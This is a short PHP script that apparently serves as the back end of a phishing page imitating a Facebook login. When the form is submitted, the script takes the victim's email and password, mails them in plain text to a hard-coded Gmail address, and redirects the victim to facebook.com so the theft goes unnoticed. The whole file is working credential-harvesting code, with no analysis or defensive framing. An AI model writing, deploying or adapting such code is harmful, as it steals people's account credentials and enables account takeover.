<?php
if($_SERVER["REQUEST_METHOD"] == "POST") {
$email = $_POST["email"];
$password = $_POST["password"];

$to = "atleticoaxixic@gmail.com";
$subject = "Nuevo inicio de sesion";
$message = "Correo electronico: $email\nContraseña: $password";
mail($to, $subject, $message);

header("Location: facebook.com");

}
?>